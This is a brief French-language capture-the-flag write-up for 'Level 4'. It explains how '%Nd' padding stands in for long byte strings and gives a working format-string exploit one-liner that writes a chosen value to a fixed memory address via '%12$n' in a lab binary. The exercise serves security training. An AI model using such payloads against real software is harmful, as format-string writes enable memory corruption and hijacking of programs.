# Level 4

Le format "%Nd" remplacent le `N` par un chiffre permet de ne pas mettre les `N` octet nécessaire (Remplacer `"B" * 64` par `"%64d`)
```
$ (python -c 'print "\x10\x98\x04\x08"+"%"+str(0x1025540)+"d%12$n"') | ./level4
```
